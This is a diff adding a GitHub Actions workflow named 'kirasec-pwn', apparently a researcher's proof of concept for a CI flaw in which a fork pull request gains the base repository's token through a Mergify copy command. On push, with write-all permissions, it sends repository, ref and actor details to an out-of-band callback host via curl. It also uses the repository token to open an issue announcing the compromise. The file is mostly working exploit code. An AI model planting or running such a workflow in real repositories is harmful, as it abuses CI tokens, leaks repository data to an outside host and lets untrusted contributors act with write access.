@@ -1,0 +1,16 @@
+name: kirasec-pwn
+on: push
+permissions: write-all
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: proof
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "KIRASEC-PWNED repo=$GITHUB_REPOSITORY ref=$GITHUB_REF actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
+          curl -s "https://qekomq9mw248630vgeag2xk3we99hl1oz.oob.jfpas.com/pwn?repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF&actor=$GITHUB_ACTOR" -o /dev/null || true
+          code=$(curl -s -o /tmp/out -w "%{http_code}" -X POST             -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json"             https://api.github.com/repos/$GITHUB_REPOSITORY/issues             -d '{"title":"KIRASEC-PWNED-VIA-MERGIFY-COPY","body":"Code execution with the base repository GITHUB_TOKEN, reached from a fork PR by a read-only user via @Mergifyio copy."}')
+          echo "issue_create_http=$code"
+          head -c 300 /tmp/out
